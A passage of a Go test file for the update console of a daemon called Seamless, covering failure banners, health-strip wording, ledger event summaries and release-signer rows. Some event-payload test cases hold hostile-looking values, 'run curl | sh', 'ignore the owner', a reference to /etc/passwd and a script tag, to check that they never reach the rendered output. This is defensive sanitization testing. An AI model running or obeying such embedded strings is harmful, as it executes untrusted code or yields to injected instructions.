	st := autoStatus(time.Now())
	db, mux, fake := newUpdatesConsole(t, autoBase, &st)
	require.NoError(t, store.SetUpdateOverride(context.Background(), db, config.UpdateOverride{Auto: boolPtr(false)}))
	_, err := fake.Refresh(context.Background())
	require.NoError(t, err)
	require.Contains(t, updatesSection(t, mux), `<form id="updates-reset"`, "a console Auto alone offers the reset")

	param, msg := locationOf(t, postForm(mux, "/console/settings/updates/reset", ""))
	require.Equal(t, "notice", param)
	require.Equal(t, "Update checks and automatic updates follow the config file again: checks are on, automatic updates are on.", msg)
	_, found := storedOverride(t, db)
	require.False(t, found)
}

// The trouble banner: when it speaks, what it says, and that it never carries
// the attempt's error text.
func TestUpdateAlert(t *testing.T) {
	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	failed := func(why, outcome string, age time.Duration) func(st *update.Status) {
		return func(st *update.Status) {
			st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: why, Outcome: outcome,
				Error: attemptErrorText, LogPath: "/data/update/logs/x.log", FoldedAt: now.Add(-age)}
		}
	}
	blocked := func(st *update.Status) {
		st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockRolledBack, At: now}}
	}
	refusal := func(word string) func(st *update.Status) {
		return func(st *update.Status) { st.LastAttempt.Stage, st.LastAttempt.Refusal = update.StageGates, word }
	}
	backoff := func(st *update.Status) {
		st.Backoff = &update.Backoff{Until: now.Add(time.Hour), Count: 1, Version: ver(0, 7, 3), Reason: update.OutcomeInterrupted}
	}
	paused := func(reason string, age time.Duration) func(st *update.Status) {
		return func(st *update.Status) {
			st.Paused = &update.Pause{Reason: reason, Versions: []update.Version{ver(0, 7, 3), ver(0, 7, 4)}, At: now.Add(-age)}
		}
	}
	autoOff := func(st *update.Status) {
		st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
	}
	checksOff := func(st *update.Status) {
		st.Settings = update.Effective(autoBase, config.UpdateOverride{Check: boolPtr(false)}, true)
	}
	for _, tc := range []struct {
		name       string
		mutate     []func(st *update.Status)
		wantHead   string
		wantLine   string
		wantDanger bool
		wantKey    string
	}{
		{name: "rolled back, blocked", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour), blocked},
			wantHead: "The update to v0.7.3 rolled back.", wantLine: "Seamless is back on v0.7.2, and automatic updates skip v0.7.3.",
			wantKey: fmt.Sprintf("failed-0.7.3-%d", now.Add(-time.Hour).Unix())},
		{name: "failed, backing off", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeFailed, time.Hour), backoff},
			wantHead: "The update to v0.7.3 failed.", wantLine: "Seamless stays on v0.7.2, and tries again in 1h."},
		{name: "refused, a stale binary: the owner's restart", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal(update.RefusalStaleBinary), backoff},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.2, and tries again in 1h. The installed seamlessd is not the version the daemon runs; " +
				"restart the service so it runs the installed release: seamlessd restart."},
		{name: "refused, not an installer install: Update now", mutate: []func(*update.Status){
			failed(update.WhyNow, update.OutcomeFailed, time.Hour), refusal(update.RefusalNotInstaller)},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.2. The install no longer looks like one the installer manages; " +
				"restart the service so it re-reads how it was installed: seamlessd restart."},
		{name: "refused, automatic updates were off: what happened, no action", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal(update.RefusalAutoOff)},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.2. Automatic updates were turned off before it began."},
		{name: "refused while the daemon ran another version: no action", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal(update.RefusalStaleBinary), func(st *update.Status) { st.Version = "0.7.1" }},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.1. The installed seamlessd is not the version the daemon runs."},
		{name: "a refusal word from a newer updater: a plain failure", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal("disk_full"), backoff},
			wantHead: "The update to v0.7.3 failed.", wantLine: "Seamless stays on v0.7.2, and tries again in 1h."},
		{name: "interrupted", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeInterrupted, time.Hour)},
			wantHead: "The update to v0.7.3 did not finish.", wantLine: "The updater stopped before it was done; Seamless stays on v0.7.2."},
		{name: "Update now, broken", mutate: []func(*update.Status){failed(update.WhyNow, update.OutcomeBroken, time.Hour)},
			wantHead: "The update to v0.7.3 could not be rolled back cleanly.", wantLine: "Settings > Updates has what went wrong and how to recover.", wantDanger: true},
		{name: "Update now with automatic updates off: no retry promised", mutate: []func(*update.Status){failed(update.WhyNow, update.OutcomeFailed, time.Hour), backoff, autoOff},
			wantHead: "The update to v0.7.3 failed.", wantLine: "Seamless stays on v0.7.2."},
		{name: "paused after rollbacks", mutate: []func(*update.Status){paused(update.PauseRollbacks, time.Hour), failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour)},
			wantHead: "Automatic updates paused themselves.", wantLine: "Two updates in a row rolled back (v0.7.3, v0.7.4), so nothing installs by itself until you resume them.",
			wantKey: fmt.Sprintf("paused-%d", now.Add(-time.Hour).Unix())},
		{name: "paused after a broken update", mutate: []func(*update.Status){paused(update.PauseBroken, time.Hour)},
			wantHead: "Automatic updates paused themselves.", wantLine: "An update could not be rolled back cleanly (v0.7.3, v0.7.4), so nothing installs by itself until you resume them.", wantDanger: true},

		// Silent.
		{name: "no attempt"},
		{name: "applied", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeApplied, time.Hour)}},
		{name: "unverified", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeUnverified, time.Hour)}},
		{name: "superseded", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeSuperseded, time.Hour)}},
		{name: "an update run by hand", mutate: []func(*update.Status){failed(update.WhyManual, update.OutcomeRolledBack, time.Hour)}},
		{name: "a week later", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, troubleBannerWindow)}},
		{name: "a pause a week old", mutate: []func(*update.Status){paused(update.PauseRollbacks, troubleBannerWindow)}},
		{name: "automatic updates off: the owner's answer", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour), autoOff}},
		{name: "a pause with automatic updates off", mutate: []func(*update.Status){paused(update.PauseRollbacks, time.Hour), autoOff}},
		{name: "checks off", mutate: []func(*update.Status){failed(update.WhyNow, update.OutcomeRolledBack, time.Hour), checksOff}},
		{name: "an update under way", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour), func(st *update.Status) {
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 4), Why: update.WhyAuto, SpawnedAt: now}
		}}},
		{name: "already running the release", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeInterrupted, time.Hour), func(st *update.Status) {
			st.Version = "0.7.3"
		}}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			for _, m := range tc.mutate {
				m(&st)
			}
			a := updateAlertFor(st, now)
			if tc.wantHead == "" {
				require.Nil(t, a)
				return
			}
			require.NotNil(t, a)
			require.Equal(t, tc.wantHead, a.Head)
			require.Equal(t, tc.wantLine, a.Line)
			require.Equal(t, tc.wantDanger, a.Danger)
			if tc.wantKey != "" {
				require.Equal(t, tc.wantKey, a.Key)
			}
			require.NotContains(t, a.Head+a.Line+a.Key, "badly", "never the attempt's error text")
			require.NotContains(t, a.Head+a.Line+a.Key, "x.log", "never the attempt's log path")
		})
	}
}

// Rendered: the trouble banner rides every page, links to Settings > Updates,
// dismisses per tab through the update banner's key, and the attempt's error
// text appears in the Last attempt row and nowhere else.
func TestUpdateAlert_OnEveryPageWithoutTheErrorText(t *testing.T) {
	now := time.Now()
	st := autoStatus(now)
	withNewer(&st, now)
	st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
		Outcome: update.OutcomeRolledBack, Stage: update.StageRollback, RolledBack: true,
		Error: attemptErrorText, LogPath: "/data/update/logs/x.log", FoldedAt: now.Add(-time.Hour)}
	st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockRolledBack, At: now.Add(-time.Hour)}}
	_, mux, _ := newUpdatesConsole(t, autoBase, &st)
	escaped := "rollback failed &lt;b&gt;badly&lt;/b&gt;"
	alertRE := regexp.MustCompile(`(?s)<div class="section notice update-alert[^"]*"[^>]*>.*?</div>\s*</div>`)
	for _, path := range []string{"/console/", "/console/memories", "/console/settings?s=updates", "/console/settings?s=experience", "/console/no-such-screen"} {
		page := getPeek(t, mux, path).Body.String()
		alert := alertRE.FindString(page)
		require.NotEmpty(t, alert, path)
		require.Contains(t, alert, `id="update-alert" role="alert" data-update-banner="failed-0.7.3-`)
		require.Contains(t, alert, "<strong>The update to v0.7.3 rolled back.</strong> Seamless is back on v0.7.2, and automatic updates skip v0.7.3.")
		require.Contains(t, alert, `<a class="btn small" href="/console/settings?s=updates">Settings &rsaquo; Updates</a>`)
		require.Contains(t, alert, "data-update-banner-dismiss")
		require.NotContains(t, alert, "data-flash", "information, not a flash the shell would toast")
		require.NotContains(t, alert, "<form", "dismissing it changes nothing on the server")

		want := 0
		if path == "/console/settings?s=updates" {
			want = 1
		}
		require.Equal(t, want, strings.Count(page, escaped), "%s: the error text appears in the Last attempt row only", path)
		require.NotContains(t, page, "<b>badly</b>", "%s: escaped wherever it appears", path)
		require.Equal(t, want, strings.Count(page, "/data/update/logs/x.log")/2, "%s: the log path shows (and copies) in that row only", path)
	}
	// A fragment is injected into a pane, never a page; a JSON caller gets data.
	require.NotContains(t, getPeek(t, mux, "/console/no-such-screen?peek=1").Body.String(), "update-alert")
	require.NotContains(t, getPeek(t, mux, "/console/?format=json").Body.String(), "update-alert")
	// The section the banner points at carries the error.
	require.Contains(t, updatesSection(t, mux), escaped)

	// The same dismissal the update banner uses, so no script changed.
	require.Contains(t, string(consoleCSS), ".update-alert[hidden] { display: none; }")
}

// The one-day "updated" banner adds Codex's hooks and an update that applied
// with warnings, from flags only.
func TestUpdateBanner_CodexHooksAndRewire(t *testing.T) {
	now := time.Now()
	for _, tc := range []struct {
		name   string
		codex  bool
		attach func(st *update.Status)
		want   []string
		absent []string
	}{
		{name: "plain", absent: []string{"Codex", "install-hooks"}},
		{name: "Codex's hooks changed", codex: true,
			want: []string{"Its Codex hooks changed: Codex skips them until you re-approve them in Codex&rsquo;s <span class=\"mono\">/hooks</span>."}},
		{name: "applied with warnings", attach: func(st *update.Status) {
			st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
				Outcome: update.OutcomeApplied, Warnings: true, Error: "applied with warnings: SECRET", FoldedAt: now}
		}, want: []string{"The installer reported warnings: run <span class=\"mono\">seamlessd install-hooks</span> to re-wire your agents."},
			absent: []string{"SECRET"}},
		{name: "warnings on another release", attach: func(st *update.Status) {
			st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 1), To: ver(0, 7, 2), Why: update.WhyAuto,
				Outcome: update.OutcomeApplied, Warnings: true, FoldedAt: now}
		}, absent: []string{"install-hooks"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			st.Version = "0.7.3"
			st.Updated = &update.Updated{From: ver(0, 7, 2), To: ver(0, 7, 3), At: now.Add(-time.Hour), Direction: update.DirectionUpgrade, CodexHooks: tc.codex}
			if tc.attach != nil {
				tc.attach(&st)
			}
			_, mux, _ := newUpdatesConsole(t, autoBase, &st)
			banner := regexp.MustCompile(`(?s)<div class="section notice update-banner"[^>]*>.*?</div>\s*</div>`).
				FindString(getPeek(t, mux, "/console/").Body.String())
			require.Contains(t, banner, "<strong>Seamless updated to v0.7.3</strong> (from v0.7.2)")
			for _, want := range tc.want {
				require.Contains(t, banner, want)
			}
			for _, gone := range tc.absent {
				require.NotContains(t, banner, gone)
			}
		})
	}
}

// The health strip says what becomes of a newer release where this install
// updates itself: never "updating is your call" when it installs by itself.
func TestHealthStrip_VersionFactUnderAutomaticUpdates(t *testing.T) {
	now := time.Now()
	lead := "Seamless v0.7.3 was published " + day(now.Add(-30*time.Hour)) + "; "
	for _, tc := range []struct {
		name      string
		mutate    func(st *update.Status)
		wantText  string
		wantTone  string
		wantTitle string
	}{
		{name: "installs by itself, waiting", mutate: func(st *update.Status) {
			st.Target, st.WaitCode, st.Waiting = st.Newest, update.WaitSessions, "waiting for 1 live agent session to go idle"
		}, wantText: "v0.7.2, v0.7.3 available", wantTitle: lead + "it installs by itself: waiting for 1 live agent session to go idle"},
		{name: "installs by itself at the next tick", mutate: func(st *update.Status) { st.Target = st.Newest },
			wantText: "v0.7.2, v0.7.3 available", wantTitle: lead + "it installs by itself within a minute"},
		{name: "soaking", mutate: func(st *update.Status) {
			st.Newest.PublishedAt = now.Add(-6 * time.Hour)
		}, wantText: "v0.7.2, v0.7.3 available", wantTitle: "Seamless v0.7.3 was published " + day(now.Add(-6*time.Hour)) + "; it installs by itself once it is 24h old"},
		{name: "blocked: the owner's call", mutate: func(st *update.Status) {
			st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockVerify, At: now}}
		}, wantText: "v0.7.2, v0.7.3 available", wantTone: "warn",
			wantTitle: lead + "automatic updates skip it (it did not pass verification), so updating to it is your call"},
		{name: "held: the owner's own pin", mutate: func(st *update.Status) {
			st.Hold = &update.Hold{Through: ver(0, 7, 3), From: ver(0, 7, 3), At: now}
		}, wantText: "v0.7.2, v0.7.3 available", wantTitle: lead + "this install went back from v0.7.3, so automatic updates skip it until they are resumed"},
		{name: "unsigned", mutate: func(st *update.Status) { st.Newest.ChecksumsBundle = false },
			wantText: "v0.7.2, v0.7.3 available", wantTone: "warn", wantTitle: lead + "it carries no signed checksums bundle, so updating to it is your call"},
		{name: "paused", mutate: func(st *update.Status) { st.Paused = &update.Pause{Reason: update.PauseRollbacks, At: now} },
			wantText: "v0.7.2, v0.7.3 available", wantTone: "warn", wantTitle: lead + "automatic updates paused themselves, so updating is your call"},
		{name: "updating", mutate: func(st *update.Status) {
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyNow, Stage: update.StageInstall, SpawnedAt: now}
		}, wantText: "v0.7.2, updating to v0.7.3", wantTitle: "Updating to v0.7.3: running the installer"},
		{name: "confirming: the new version already runs", mutate: func(st *update.Status) {
			st.Version, st.Available = "0.7.3", false
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto, Stage: update.StageConfirm, SpawnedAt: now}
		}, wantText: "v0.7.3, confirming the update", wantTone: "ok",
			wantTitle: "Updated from v0.7.2; the updater is confirming that v0.7.3 answers"},
		{name: "rolling back from the new version is no confirmation", mutate: func(st *update.Status) {
			st.Version, st.Available = "0.7.3", false
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto, Stage: update.StageRollback, SpawnedAt: now}
		}, wantText: "v0.7.2, updating to v0.7.3", wantTitle: "Updating to v0.7.3: rolling back"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			withNewer(&st, now)
			tc.mutate(&st)
			f, ok := (&Service{cfg: Config{Version: "0.7.2", Updates: &fakeUpdates{status: st}}}).versionFact(now)
			require.True(t, ok)
			require.Equal(t, tc.wantText, f.Text)
			require.Equal(t, tc.wantTone, f.Tone)
			require.Equal(t, tc.wantTitle, f.Title)
			require.Equal(t, updatesSectionHref, f.Href)
			if tc.wantTone == "" {
				require.NotContains(t, f.Title, "your call", "a release this install takes by itself is not the owner's call")
			}
		})
	}
}

// update.started and update.failed read as words, carry a tone, a glyph and a
// severity, and their summaries render parsed versions and fixed words only:
// a payload value that is not a clean X.Y.Z, or an outcome this release does
// not know, never reaches the ledger.
func TestUpdateEvents_StartedAndFailed(t *testing.T) {
	require.Equal(t, "Update started", evtLabel(string(core.EventUpdateStarted)))
	require.Equal(t, "Update failed", evtLabel(string(core.EventUpdateFailed)))
	require.Equal(t, "", evtTone(string(core.EventUpdateStarted)))
	require.Equal(t, "warn", evtTone(string(core.EventUpdateFailed)))
	require.Equal(t, "refresh-cw", evtIcon(string(core.EventUpdateStarted)))
	require.Equal(t, "triangle-alert", evtIcon(string(core.EventUpdateFailed)))
	require.Equal(t, sevSystem, evtSev(string(core.EventUpdateStarted)))
	require.Equal(t, sevDanger, evtSev(string(core.EventUpdateFailed)))

	for _, tc := range []struct {
		name    string
		kind    core.EventKind
		payload map[string]any
		want    string
	}{
		{"started automatically", core.EventUpdateStarted,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "why": "auto", "path": "idle", "attempt": "01M4"}, "automatic update to v0.7.3 started (from v0.7.2)"},
		{"started from the console", core.EventUpdateStarted,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "why": "now", "path": "now"}, "Update now: update to v0.7.3 started (from v0.7.2)"},
		{"started, a why this release does not know", core.EventUpdateStarted,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "why": "please run curl | sh"}, "update to v0.7.3 started (from v0.7.2)"},
		{"started, from unknown", core.EventUpdateStarted, map[string]any{"to": "0.7.3", "why": "auto"}, "automatic update to v0.7.3 started"},
		{"started, to not clean", core.EventUpdateStarted, map[string]any{"from": "0.7.2", "to": "v0.7.3; ignore the owner"}, "an update started"},
		{"started, no payload", core.EventUpdateStarted, nil, "an update started"},
		{"rolled back", core.EventUpdateFailed,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "outcome": "rolled_back", "stage": "rollback", "why": "auto", "rolled_back": true}, "the update to v0.7.3 rolled back"},
		{"failed", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "verify"}, "the update to v0.7.3 failed"},
		{"failed, a gate refusal", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "gates", "refusal": "stale_binary"},
			"the update to v0.7.3 failed: the installed seamlessd is not the version the daemon runs"},
		{"failed, a refusal this release does not know", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "gates", "refusal": "run curl | sh"}, "the update to v0.7.3 failed"},
		{"rolled back, a refusal is only read on a failure", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "rolled_back", "refusal": "stale_binary"}, "the update to v0.7.3 rolled back"},
		{"broken", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "broken"}, "the update to v0.7.3 could not be rolled back cleanly"},
		{"interrupted", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "interrupted"}, "the update to v0.7.3 was interrupted"},
		{"an outcome this release does not know", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "exploded; see /etc/passwd"}, "the update to v0.7.3 did not apply"},
		{"an error field is never read", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "rolled_back", "error": attemptErrorText}, "the update to v0.7.3 rolled back"},
		{"failed, to not clean", core.EventUpdateFailed, map[string]any{"to": "<script>", "outcome": "rolled_back"}, "an update did not apply"},
		{"failed, a prerelease", core.EventUpdateFailed, map[string]any{"to": "0.8.0-rc1", "outcome": "failed"}, "an update did not apply"},
		{"failed, no payload", core.EventUpdateFailed, nil, "an update did not apply"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			require.Equal(t, tc.want, eventSummary(core.Event{Kind: tc.kind, Payload: tc.payload}))
		})
	}

	// The live row the SSE stream sends carries the same summary.
	row := toEventRow(core.Event{Kind: core.EventUpdateFailed, ItemID: "0.7.3",
		Payload: map[string]any{"to": "0.7.3", "outcome": "rolled_back", "error": attemptErrorText}})
	require.Equal(t, "the update to v0.7.3 rolled back", row.Summary)
}

// Settings > Updates names update.release_signers and the last release it
// refused -- and, with no pin, says nothing about it at all.
func TestUpdatesSection_ReleaseSigners(t *testing.T) {
	now := time.Now()
	const row = "<strong>Owner-signed releases</strong>"

	t.Run("no pin: no row, even with a refusal on record", func(t *testing.T) {
		st := autoStatus(now)
		st.SignatureRefusal = &update.SignatureRefusal{Version: ver(0, 7, 3), Signature: update.SignatureMissing, At: now}
		_, mux, _ := newUpdatesConsole(t, autoBase, &st)
		sec := updatesSection(t, mux)
		require.NotContains(t, sec, row)
		require.NotContains(t, sec, "release_signers")
	})
	pinned := autoBase
	pinned.ReleaseSigners = "/opt/seamless/etc/release_signers"
	t.Run("a pin, nothing refused", func(t *testing.T) {
		st := autoStatus(now)
		st.Settings = update.Effective(pinned, config.UpdateOverride{}, true)
		_, mux, _ := newUpdatesConsole(t, pinned, &st)
		sec := updatesSection(t, mux)
		require.Contains(t, sec, row)
		require.Contains(t, sec, "verifies against a key in /opt/seamless/etc/release_signers (update.release_signers)", "the file is in the row's hint")
		require.Contains(t, sec, `<div class="set-row-control"><span class="badge ok">required</span></div>`)
		require.NotContains(t, sec, "Last refused")
	})
	t.Run("a pin and the last refusal, in fixed words", func(t *testing.T) {
		st := autoStatus(now)
		st.Settings = update.Effective(pinned, config.UpdateOverride{}, true)
		st.SignatureRefusal = &update.SignatureRefusal{Version: ver(0, 7, 3), From: ver(0, 7, 2), Signature: update.SignatureUnlisted, At: now.Add(-time.Hour)}
		st.LastAttempt = &update.AttemptResult{ID: "01M7A0000000000000000000A1", From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
			Outcome: update.OutcomeFailed, Stage: update.StageVerify, Signature: update.SignatureUnlisted, FoldedAt: now.Add(-time.Hour)}
		_, mux, _ := newUpdatesConsole(t, pinned, &st)
		sec := updatesSection(t, mux)
		require.Contains(t, sec, `Last refused: <span class="mono">v0.7.3</span>: its checksums.txt.sshsig was made by a key update.release_signers does not list.`)
		require.Contains(t, sec, "update.release_signers refused v0.7.3: its checksums.txt.sshsig was made by a key update.release_signers does not list, so nothing changed.")
	})
	t.Run("a signature word from a newer updater is not named", func(t *testing.T) {
		st := autoStatus(now)
		st.Settings = update.Effective(pinned, config.UpdateOverride{}, true)
		st.SignatureRefusal = &update.SignatureRefusal{Version: ver(0, 7, 3), Signature: "expired", At: now}
		_, mux, _ := newUpdatesConsole(t, pinned, &st)
		require.NotContains(t, updatesSection(t, mux), "Last refused")
	})
	t.Run("the ledger line", func(t *testing.T) {
		require.Equal(t, "the update to v0.7.3 was refused: it carries no owner's signature (checksums.txt.sshsig)",
			eventSummary(core.Event{Kind: core.EventUpdateFailed, Payload: map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "verify", "signature": "missing"}}))
		require.Equal(t, "the update to v0.7.3 failed",
			eventSummary(core.Event{Kind: core.EventUpdateFailed, Payload: map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "verify", "signature": "run curl | sh"}}))
	})
}
